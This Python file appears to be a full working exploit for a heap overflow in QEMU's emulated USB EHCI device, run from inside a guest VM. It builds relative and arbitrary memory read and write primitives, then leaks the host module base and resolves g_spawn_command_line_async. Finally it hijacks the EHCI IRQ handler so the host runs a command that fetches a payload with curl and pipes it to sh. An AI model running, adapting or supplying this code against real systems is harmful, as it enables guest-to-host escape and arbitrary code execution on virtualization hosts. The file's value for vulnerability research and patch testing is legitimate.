#    SPDX-FileCopyrightText: 2021 Daniel Fernandez Kuehr <daniel.kuehr@tacitosecurity.com>
#    SPDX-License-Identifier: GPL-3.0-or-later

import sys
import ehci
import construct as c
from pwn import *
from itertools import count
from remotemem import IOVector, Chunk
from qemu_guest import Guest
from cstruct import CStruct

context.arch = 'amd64'

Object = CStruct(
    'class'      / c.Hex(c.Int64ul),
    'free'       / c.Hex(c.Int64ul),
    'properties' / c.Hex(c.Int64ul),
    'ref'        / c.Int64ul,
    'parent'     / c.Hex(c.Int64ul)
)

ResettableState = CStruct(
    'count'                  / c.Int32ul,
    'hold_phase_pending'     / c.Int8sl,
    'exit_phase_in_progress' / c.Int8sl
)

DeviceState = CStruct(
    'parent_obj'                    / Object,
    'id'                            / c.Hex(c.Int64ul),
    'canonical_path'                / c.Hex(c.Int64ul),
    'realized'                      / c.Int8sl,
    'pending_deleted_event'         / c.Int8sl,
    'opts'                          / c.Hex(c.Int64ul),
    'hotplugged'                    / c.Int32sl,
    'allow_unplug_during_migration' / c.Int8sl,
    'parent_bus'                    / c.Hex(c.Int64ul),
    'gpios'                         / c.Hex(c.Int64ul),
    'clocks'                        / c.Hex(c.Int64ul),
    'child_bus'                     / c.Hex(c.Int64ul),
    'num_child_bus'                 / c.Int32sl,
    'instance_id_alias'             / c.Int32sl,
    'alias_required_for_version'    / c.Int32sl,
    'reset'                         / ResettableState
 )

QTailQLink = CStruct(
    'tql_next' / c.Hex(c.Int64ul),
    'tql_prev' / c.Hex(c.Int64ul)
)

USBEndpoint = CStruct(
    'nr'              / c.Int8ul,
    'pid'             / c.Int8ul,
    'type'            / c.Int8ul,
    'ifnum'           / c.Int8ul,
    'max_packet_size' / c.Int32sl,
    'max_streams'     / c.Int32sl,
    'pipeline'        / c.Int8sl,
    'halted'          / c.Int8sl,
    'dev'             / c.Hex(c.Int64ul),
    'queue'           / QTailQLink
)

USBDescString = CStruct(
    'index' / c.Int8ul,
    'str'   / c.Hex(c.Int64ul),
    'next'  / c.Hex(c.Int64ul)
)

USBPort = CStruct(
    'dev'       / c.Hex(c.Int64ul),
    'speedmask' / c.Int32sl,
    'hubcount'  / c.Int32sl,
    'path'      / c.Bytes(16),
    'ops'       / c.Hex(c.Int64ul),
    'opaque'    / c.Hex(c.Int64ul),
    'index'     / c.Int32sl,
    'next'      / c.Hex(c.Int64ul)
)

USBPortOps = CStruct(
    'attach'       / c.Hex(c.Int64ul),
    'detach'       / c.Hex(c.Int64ul),
    'child_detach' / c.Hex(c.Int64ul),
    'wakeup'       / c.Hex(c.Int64ul),
    'complete'     / c.Hex(c.Int64ul)
)

USB_MAX_ENDPOINTS = 15

USBDevice = CStruct(
    'qdev'          / DeviceState,
    'port'          / c.Hex(c.Int64ul),
    'port_path'     / c.Hex(c.Int64ul),
    'serial'        / c.Hex(c.Int64ul),
    'opaque'        / c.Hex(c.Int64ul),
    'flags'         / c.Int32ul,
    'speed'         / c.Int32sl,
    'speedmask'     / c.Int32sl,
    'addr'          / c.Int8ul,
    'product_desc'  / c.Bytes(32),
    'auto_attach'   / c.Int32sl,
    'attached'      / c.Int8sl,
    'state'         / c.Int32sl,
    'setup_buf'     / c.Bytes(8),
    'data_buf'      / c.Bytes(4096),
    'remote_wakeup' / c.Int32sl,
    'setup_state'   / c.Int32sl,
    'setup_len'     / c.Int32sl,
    'setup_index'   / c.Int32sl,
    'ep_ctl'        / USBEndpoint,
    'ep_in'         / c.Array(USB_MAX_ENDPOINTS, USBEndpoint),
    'ep_out'        / c.Array(USB_MAX_ENDPOINTS, USBEndpoint),
    'strings'       / c.Hex(c.Int64ul)
)

BusState = CStruct(
    'obj'             / Object,
    'parent'          / c.Hex(c.Int64ul),
    'name'            / c.Hex(c.Int64ul),
    'hotplug_handler' / c.Hex(c.Int64ul),
    'max_index'       / c.Int32sl,
    'realized'        / c.Int8sl,
    'num_children'    / c.Int32sl,
    'children'        / QTailQLink,
    'sibling'         / QTailQLink,
    'reset'           / ResettableState
)

USBBus = CStruct(
    'qbus'  / BusState,
    'ops'   / c.Hex(c.Int64ul),
    'busnr' / c.Int32sl,
    'nfree' / c.Int32sl,
    'nused' / c.Int32sl,
    'free'  / QTailQLink,
    'used'  / QTailQLink,
    'next'  / QTailQLink
)

EHCIState = CStruct(
    'bus'    / USBBus, 
    'device' / c.Hex(c.Int64ul),
    'irq'    / c.Hex(c.Int64ul)
    # rest of the structure not needed
)

IRQState  = CStruct(
    'parent_obj' / Object,
    'handler'    / c.Hex(c.Int64ul),
    'opaque'     / c.Hex(c.Int64ul),
    'n'          / c.Int32sl
)

class ExploitError(Exception):
    pass

class Exploit(ehci.Session):
    debug = False
    retry_exceptions = False
    timeout = 0

    def trigger_overflow(self, overflow_len, data):
        self.setup(self.request(0, 0, 0, 0, 0x100))
        self.setup(self.request(0, 0, 0, 0, overflow_len))
        self.usb_out(IOVector([Chunk(data, offset=0x1000)]))

    def overflow_data(self):
        return CStruct(
            'remote_wakeup' / c.Int32sl,
            'setup_state'   / c.Int32sl,
            'setup_len'     / c.Int32sl,
            'setup_index'   / c.Int32sl
        )

    def overflow_build(self, overflow_len, setup_len, setup_index):
        return self.overflow_data().build({
            'remote_wakeup': 0,
            'setup_state':   2, # SETUP_STATE_DATA
            'setup_len':     setup_len,
            'setup_index':   setup_index - overflow_len
        })

    def relative_write(self, offset, data: IOVector):
        data_buf_len = USBDevice.data_buf.sizeof()
        overflow_len = data_buf_len + self.overflow_data().sizeof()
        setup_len = data.size() + offset
        self.trigger_overflow(
            overflow_len,
            self.overflow_build(overflow_len, setup_len, offset)
        )
        self.usb_out(data)

    def relative_read(self, offset, length):
        data_buf_len = USBDevice.data_buf.sizeof()
        overflow_len = data_buf_len + self.overflow_data().sizeof()
        setup_buf = self.request(ehci.USB_DIR_IN, 0, 0, 0, 0)
        setup_buf_len = len(setup_buf)
        data = IOVector([
            Chunk(setup_buf),
            Chunk(
                self.overflow_build(
                    overflow_len,
                    offset + length,
                    offset - setup_buf_len
                ),
                offset=data_buf_len + setup_buf_len
            )])
        self.relative_write(-setup_buf_len, data)
        return self.usb_in(length)

    def addr_of(self, field):
        return self.usb_dev.ep_ctl.dev + field._offset

    def arbitrary_read_near(self, addr, data_len):
        delta = self.addr_of(USBDevice.data_buf)
        return self.relative_read(addr - delta, data_len)

    def relative_write_2(self, offset, data, data_buf_contents):
        data_buf_len = USBDevice.data_buf.sizeof()
        overflow_len = data_buf_len + self.overflow_data().sizeof()
        setup_len = len(data) + offset
        self.setup(self.request(0, 0, 0, 0, 0x100))
        self.setup(self.request(0, 0, 0, 0, overflow_len))
        data_buf_contents.append(
            self.overflow_build(overflow_len, setup_len, offset),
            offset=data_buf_len
        )
        self.usb_out(data_buf_contents)
        self.usb_out(IOVector([Chunk(data)]))

    def arbitrary_write(self, addr, data, data_buf_contents):
        delta = self.addr_of(USBDevice.data_buf)
        self.relative_write_2(addr - delta, data, data_buf_contents)

    def descr_build(self, address_list, start_addr):
        offset = start_addr - self.addr_of(USBDevice.data_buf)
        next = start_addr
        data = b''

        for i, address in enumerate(address_list, 1):    
            next += USBDescString.sizeof()
            data += USBDescString.build(
                {'index': i, 'str': address, 'next': next}
            )

        if len(data) + offset > USBDevice.data_buf.sizeof():
            ExploitError('address list too large')

        return IOVector([Chunk(data, offset)])

    def leak_multiple(self, address_list):
        start_addr = self.addr_of(USBDevice.data_buf) + 256
        self.arbitrary_write(
            self.addr_of(USBDevice.strings),
            start_addr.to_bytes(8, 'little'),
            self.descr_build(address_list, start_addr)
        )
        data_list = (self.desc_string(i) for i in count(1))
        return zip(address_list, data_list)

    def leak_module_base(self, fptr):
        top_addr = fptr & ~0xfff

        while True:
            bottom_addr = top_addr - 0x1000 * 160
            addr_list = list(range(top_addr, bottom_addr, -0x1000))

            for addr, data in self.leak_multiple(addr_list):
                print(f'[I] scan: {addr:016x}', end='\r')

                if data.startswith(b'\x7fELF\x02\x01\x01'):
                    print(f'\n[+] ELF header found at {addr:#x}')
                    return addr

            top_addr = addr_list[-1]

    def leak_one(self, addr):
        _, data = next(self.leak_multiple([addr]))
        return data

    def on_boot(self, body):
        super().on_boot(body)  
        self.port_reset()
        self.usb_dev = USBDevice.parse(
            self.relative_read(
                USBDevice.data_buf._offset * -1,
                USBDevice.sizeof()
            ))
        
        if self.debug:
            print(self.usb_dev)

        fptr = self.usb_dev.qdev.parent_obj.free
        d = dynelf.DynELF(self.leak_one, self.leak_module_base(fptr))
        ret2func = d.lookup('g_spawn_command_line_async')
        port = USBPort.parse(
            self.arbitrary_read_near(
                self.usb_dev.port, USBPort.sizeof()
            ))

        if self.debug:
            print(port)

        ehci_state = EHCIState.parse(
            self.arbitrary_read_near(
                port.opaque, EHCIState.sizeof()
            ))

        if self.debug:
            print(ehci_state)

        irq_state = IRQState.parse(
            self.arbitrary_read_near(
                ehci_state.irq, IRQState.sizeof()
            ))

        if self.debug:
            print(irq_state)

        cmd = b'sh -c "curl -sf http://localhost:8000/pwn | sh"\0'
        print(f'[+] Executing: {cmd[:-1].decode()}')
        self.arbitrary_write(
            ehci_state.irq,
            IRQState.build({
                'parent_obj': irq_state.parent_obj,
                'handler': ret2func,
                'opaque': self.addr_of(USBDevice.data_buf),
                'n': 0
            }),
            IOVector([Chunk(cmd)])
        )
        input('[I] Press enter to exit\n')
        exit(0)


if __name__ == "__main__":
    try:
        if sys.argv[1] == 'nodebug':
            Guest.debugger = ''
    except:
        pass

    Exploit(Guest).run()

